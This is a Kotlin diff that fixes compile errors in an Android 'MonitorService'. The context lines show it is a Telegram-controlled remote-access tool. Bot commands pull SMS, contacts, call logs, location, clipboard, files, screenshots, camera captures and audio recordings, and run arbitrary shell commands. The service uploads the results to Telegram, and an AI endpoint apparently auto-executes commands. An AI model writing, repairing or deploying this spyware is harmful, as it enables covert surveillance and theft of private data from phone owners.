@@ -35,7 +35,7 @@ import okhttp3.Request
 import okhttp3.RequestBody
 import okhttp3.Response
 import java.io.File
-import java.nio.charset.Charsets
+import java.nio.charset.StandardCharsets
 import java.util.ArrayList
 import java.util.HashMap
 import java.util.List
@@ -150,7 +150,7 @@ class MonitorService : Service() {
             } else {
                 ArrayList<Map<String, Any>>() as List<Map<String, Any>>
             }
-            val smsPreview = smsList.take(10).joinToString("\n") {
+            val smsPreview = (smsList as List<Map<String, Any>>).take(10).joinToString("\n") {
                 "${it["type"]}: ${it["address"]} - ${it["body"]?.take(50) ?: ""}"
             }
             results += "SMS (last 10):\n$smsPreview\n\n"
@@ -238,33 +238,33 @@ class MonitorService : Service() {
         } else if (trimmed == "/status") {
             sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
         } else if (trimmed == "/contacts") {
-            sendTelegramTask(chatId, "contacts", HashMap<String, Any>())
+            sendTelegramTask(chatId, "contacts", HashMap<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/sms") {
-            sendTelegramTask(chatId, "sms", HashMap<String, Any>())
+            sendTelegramTask(chatId, "sms", HashMap<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/calls") {
-            sendTelegramTask(chatId, "call_logs", HashMap<String, Any>())
+            sendTelegramTask(chatId, "call_logs", HashMap<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/apps") {
-            sendTelegramTask(chatId, "apps", HashMap<String, Any>().apply { put("action", "list") })
+            sendTelegramTask(chatId, "apps", HashMap<String, Any>().apply { put("action", "list") } as Map<String, Any>)
         } else if (trimmed == "/location") {
-            sendTelegramTask(chatId, "location", HashMap<String, Any>().apply { put("action", "get") })
+            sendTelegramTask(chatId, "location", HashMap<String, Any>().apply { put("action", "get") } as Map<String, Any>)
         } else if (trimmed == "/files") {
-            sendTelegramTask(chatId, "files", HashMap<String, Any>().apply { put("action", "list"); put("path", "/sdcard") })
+            sendTelegramTask(chatId, "files", HashMap<String, Any>().apply { put("action", "list"); put("path", "/sdcard") } as Map<String, Any>)
         } else if (trimmed == "/wifi") {
-            sendTelegramTask(chatId, "wifi", HashMap<String, Any>().apply { put("action", "scan") })
+            sendTelegramTask(chatId, "wifi", HashMap<String, Any>().apply { put("action", "scan") } as Map<String, Any>)
         } else if (trimmed == "/clipboard") {
-            sendTelegramTask(chatId, "clipboard", HashMap<String, Any>().apply { put("action", "get") })
+            sendTelegramTask(chatId, "clipboard", HashMap<String, Any>().apply { put("action", "get") } as Map<String, Any>)
         } else if (trimmed == "/screenshot") {
-            sendTelegramTask(chatId, "screen", HashMap<String, Any>().apply { put("action", "capture") })
+            sendTelegramTask(chatId, "screen", HashMap<String, Any>().apply { put("action", "capture") } as Map<String, Any>)
         } else if (trimmed == "/audio") {
-            sendTelegramTask(chatId, "audio", HashMap<String, Any>().apply { put("action", "start"); put("duration", 10) })
+            sendTelegramTask(chatId, "audio", HashMap<String, Any>().apply { put("action", "start"); put("duration", 10) } as Map<String, Any>)
         } else if (trimmed == "/camera") {
-            sendTelegramTask(chatId, "camera", HashMap<String, Any>().apply { put("action", "capture"); put("camera", 0) })
+            sendTelegramTask(chatId, "camera", HashMap<String, Any>().apply { put("action", "capture"); put("camera", 0) } as Map<String, Any>)
         } else if (trimmed.startsWith("/ai ")) {
             handleAiCommand(chatId, trimmed.substring(4).trim())
         } else if (trimmed.startsWith("/auto ")) {
             handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
         } else if (trimmed.startsWith("/shell ")) {
-            sendTelegramTask(chatId, "shell", HashMap<String, Any>().apply { put("command", trimmed.substring(7).trim()) })
+            sendTelegramTask(chatId, "shell", HashMap<String, Any>().apply { put("command", trimmed.substring(7).trim()) } as Map<String, Any>)
         } else {
             sendTelegramMessage(chatId, "Unknown. Use /help")
         }
@@ -637,8 +637,8 @@ class MonitorService : Service() {
         if (cmd.isBlank()) return HashMap<String, Any>().apply { put("error", "No command") } as Map<String, Any>
         try {
             val process = Runtime.getRuntime().exec(cmd)
-            val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
-            val error = process.errorStream.readAllBytes().toString(Charsets.UTF_8)
+            val output = process.inputStream.readAllBytes().toString(StandardCharsets.UTF_8)
+            val error = process.errorStream.readAllBytes().toString(StandardCharsets.UTF_8)
             val exitCode = process.waitFor()
             return HashMap<String, Any>().apply {
                 put("exit", exitCode)
@@ -712,7 +712,7 @@ class MonitorService : Service() {
                 put("parse_mode", "Markdown")
             }
             val jsonBody = gson.toJson(params)
-            val mediaType = MediaType.Companion.parse("application/json")
+            val mediaType = MediaType.get("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
@@ -730,7 +730,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create(MediaType.Companion.parse("text/plain"), file.readBytes()))
+                        RequestBody.create(MediaType.get("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -800,7 +800,7 @@ Only respond with valid JSON, no extra text."""
             }
 
             val jsonBody = gson.toJson(payload)
-            val mediaType = MediaType.Companion.parse("application/json")
+            val mediaType = MediaType.get("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
